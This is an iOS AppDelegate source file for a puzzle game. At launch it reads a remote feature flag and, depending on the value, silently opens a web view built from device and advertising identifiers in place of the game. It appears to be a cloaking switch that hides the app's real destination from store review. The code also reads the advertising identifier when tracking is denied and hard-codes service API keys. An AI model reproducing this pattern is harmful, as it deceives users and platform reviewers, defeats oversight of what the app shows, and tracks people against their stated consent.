//
//  AppDelegate.swift
//  PuzzlePastry
//
//  Created by Андрей Сторожко on 02.09.2024.
//

import UIKit
import FirebaseCore
import FlagsmithClient
import AppsFlyerLib
import AppTrackingTransparency
import SwiftUI
import AdSupport

@main
class AppDelegate: UIResponder, UIApplicationDelegate, DeepLinkDelegate {
    
    var window: UIWindow?
    weak var initialVC: ViewController?
    var identifierAdvertising: String = ""
    var timer = 0
    static var orientationLock = UIInterfaceOrientationMask.all
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        FirebaseApp.configure()
        Flagsmith.shared.apiKey = "mR5qyTua3JeJSRWGLvwno8"
        
        let viewController = ViewController()
        initialVC = viewController
        window?.rootViewController = initialVC
        window?.makeKeyAndVisible()
        AppsFlyerLib.shared().appsFlyerDevKey = "MnRJTTByrGp3LNr2wfW7Sd"
        AppsFlyerLib.shared().appleAppID = "6670607690"
        AppsFlyerLib.shared().deepLinkDelegate = self
        AppsFlyerLib.shared().delegate = self
        
        start(viewController: viewController)
        
        AppsFlyerLib.shared().start()
        AppsFlyerLib.shared().waitForATTUserAuthorization(timeoutInterval: 60)
        return true
    }
    
    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        return AppDelegate.orientationLock
    }
    
    func start(viewController: ViewController) {
        Flagsmith.shared.getValueForFeature(withID: "puzzleid", forIdentity: nil) { result in
            DispatchQueue.main.async {
                switch result {
                case .success(let value):
                    
                    let deviceID = AppsFlyerLib.shared().getAppsFlyerUID()
                    
                    guard let stringJSON = value?.stringValue else {
                        viewController.openApp()
                        return
                    }
                    
                    self.parseJSONString(stringJSON) { parsedResult in
                        
                        guard parsedResult != "respect" else {
                            viewController.openApp()
                            return
                        }
                        
                        guard !parsedResult.isEmpty else {
                            print("IIIAAA OPEN APP 1")
                            viewController.openApp()
                            return
                        }
                        
                        print("IIIAAA SECOND")
                        if self.identifierAdvertising.isEmpty {
                            print("IIIAAA THIRD")
                            self.timer = 5
                            self.identifierAdvertising = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                        }
                        
                        if self.identifierAdvertising.isEmpty {
                            viewController.openApp()
                            return
                        }
                        
                        
                        DispatchQueue.main.asyncAfter(deadline: .now() + .seconds(self.timer)) {
                            let stringURL = viewController.createURL(mainURL: parsedResult, deviceID: deviceID, advertiseID: self.identifierAdvertising)
                            print("IIIAAA URL: \(stringURL)")
                            
                            guard let url = URL(string: stringURL) else {
                                viewController.openApp()
                                return
                            }
                            
                            if UIApplication.shared.canOpenURL(url) {
                                viewController.openWeb(stringURL: stringURL)
                            } else {
                                print("IIIAAA OPEN APP")
                                viewController.openApp()
                            }
                        }
                    }
                    
                case .failure(let error):
                    print("Error: \(error.localizedDescription)")
                    viewController.openApp()
                }
            }
        }
        
    }
    
    func parseJSONString(_ jsonString: String, completion: @escaping (String) -> Void) {
        
        if let jsonData = jsonString.data(using: .utf8) {
            do {
                let property = try JSONDecoder().decode(Property.self, from: jsonData)
                completion(property.clock)
            } catch {
                print("Failed to decode JSON: \(error)")
            }
        } else {
            print("Failed to convert string to Data")
        }
    }
    
    func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -> Bool {
        AppsFlyerLib.shared().handleOpen(url, sourceApplication: sourceApplication, withAnnotation: annotation)
        return true
    }
    
    
    func applicationDidBecomeActive(_ application: UIApplication) {
            AppsFlyerLib.shared().waitForATTUserAuthorization(timeoutInterval: 60)
            ATTrackingManager.requestTrackingAuthorization { (status) in
                print("IIIAAA FIRST")
                self.timer = 10
                switch status {
                case .authorized:
                    self.identifierAdvertising = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                    self.timer = 1
                case .denied:
                    print("Denied")
                    self.identifierAdvertising = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                case .notDetermined:
                    print("Not Determined")
                case .restricted:
                    print("Restricted")
                @unknown default:
                    print("Unknown")
                }
            }
        AppsFlyerLib.shared().start()
    }
}

extension AppDelegate: AppsFlyerLibDelegate {
    func onConversionDataSuccess(_ data: [AnyHashable: Any]) {
        print("||||||||||")
        print(data)
        print("||||||||||")
    }
    
    func onConversionDataFail(_ error: Error) {
        
    }
}

// MARK: - Property
struct Property: Codable {
    let walk: [Int]
    let clock, propertyGuard, season, source: String
    
    enum CodingKeys: String, CodingKey {
        case walk, clock
        case propertyGuard = "guard"
        case season, source
    }
}

